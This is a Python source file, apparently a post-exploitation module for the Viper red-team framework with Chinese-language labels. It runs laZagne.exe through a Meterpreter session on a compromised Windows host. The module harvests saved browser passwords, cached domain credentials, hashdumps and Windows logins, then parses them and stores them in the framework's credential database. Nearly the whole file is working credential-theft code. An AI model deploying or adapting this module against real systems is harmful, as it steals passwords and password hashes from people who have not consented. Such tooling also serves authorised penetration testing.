# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

#
#

import base64
import json
import re

from PostModule.lib.Credential import Credential
from PostModule.lib.Host import Host
from PostModule.lib.ModuleTemplate import PostMSFExecPEModule, TAG2CH
from PostModule.lib.OptionAndResult import Option, register_options
from PostModule.lib.Session import Session


class PostModule(PostMSFExecPEModule):
    NAME = "获取Windows常用软件密码"
    DESC = "模块使用lazagne尝试获取系统密码信息,默认功能会尝试获取浏览器存储的密码.\n" \
           "(如果需要获取更多密码信息,可尝试使用all参数,但可能会超时)"
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1081"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1081/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        Option(name='Type', name_tag="密码类型", type='enum', required=True, desc="选择需要收集的密码类型,ALL为全部收集",
               default='browsers',
               enum_list=[
                   {'name': '全部', 'value': 'all'},
                   {'name': '浏览器', 'value': 'browsers'},
                   {'name': 'windows', 'value': 'windows'},
                   {'name': 'SVN', 'value': 'svn'},
                   {'name': 'git', 'value': 'git'},
                   {'name': '邮箱', 'value': 'mails'},
                   {'name': 'wifi', 'value': 'wifi'},
                   {'name': '内存', 'value': 'memory'},
                   {'name': '数据库', 'value': 'databases'},
                   {'name': 'php', 'value': 'php'},
                   {'name': 'sysadmin', 'value': 'sysadmin'},
                   {'name': 'maven', 'value': 'maven'},
                   {'name': '聊天工具', 'value': 'chats'},

               ]),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.set_pepath('laZagne.exe')

        if self.param('Type') is None:
            self.set_args('browsers')
        else:
            self.set_args(self.param('Type'))

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows:
            return True, None
        else:
            return False, "此模块只支持Windows的Meterpreter"

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败")
            self.log_error(message)
            return

        passwords_dict = []
        host_ipaddress = Host.get_ipaddress(self._hid)

        try:
            result = re.search('##########OUTPPUTFORJSON=(\S+)', data).groups()[0]
            passwords_dict = json.loads(base64.b64decode(result))
            pass
        except Exception as E:
            pass
        password_count = 0
        for user_password in passwords_dict:
            windows_user = user_password.get('User')
            passwords = user_password.get('Passwords')
            if isinstance(passwords, list):  # 检查是否抓取到了密码
                for category_passwords in passwords:
                    category = category_passwords[0].get('Category')
                    if category in ['Google chrome','Firefox' ]:  # 表示是浏览器
                        for login_password in category_passwords[1]:
                            try:
                                url = login_password.get('URL')
                            except Exception as E:
                                url = None
                                pass
                            if url is not None:
                                url = login_password.get('URL')
                                username = login_password.get('Login')
                                password = login_password.get('Password')
                                Credential.add_credential(username=username, password=password,
                                                          password_type='browsers',
                                                          # tag={'url': url, 'user': windows_user, 'browser': category},
                                                          tag={'url': url, 'browser': category},
                                                          source_module=self.NAME, host_ipaddress=host_ipaddress,
                                                          desc='')
                                password_count += 1
                    elif category == 'Mscache':
                        try:
                            for login_password in category_passwords[1]:
                                datalist = login_password.split(':')
                                username = datalist[0]
                                password = datalist[1]
                                domain = datalist[2]
                                tag = {'domain': domain, 'type': 'Mscache'}
                                Credential.add_credential(username=username, password=password,
                                                          password_type='windows', tag=tag,
                                                          source_module=self.NAME, host_ipaddress=host_ipaddress,
                                                          desc=datalist[3])
                                password_count += 1
                        except Exception as E:
                            pass
                    elif category == 'Hashdump':
                        try:
                            for login_password in category_passwords[1]:
                                datalist = login_password.split(':')
                                username = datalist[0]
                                sid = datalist[1]
                                password = "{}:{}".format(datalist[2], datalist[3])
                                domain = "local"
                                tag = {'domain': domain, 'type': 'Hashdump', 'sid': sid}
                                Credential.add_credential(username=username, password=password,
                                                          password_type='windows', tag=tag,
                                                          source_module=self.NAME, host_ipaddress=host_ipaddress,
                                                          desc='')
                                password_count += 1
                        except Exception as E:
                            pass
                    elif category == 'Windows':
                        try:
                            for login_password in category_passwords[1]:
                                username = login_password.get('Login')
                                password = login_password.get('Password')
                                domain = "local"
                                tag = {'domain': domain, 'type': 'Windows', }
                                Credential.add_credential(username=username, password=password,
                                                          password_type='windows', tag=tag,
                                                          source_module=self.NAME, host_ipaddress=host_ipaddress,
                                                          desc='')
                                password_count += 1
                        except Exception as E:
                            pass
                    else:
                        print(category_passwords)

        format_output = "运行完成,共找到 {} 个密码,可以在<数据管理>-<凭证> 页面查看".format(password_count)
        self.log_good(format_output)
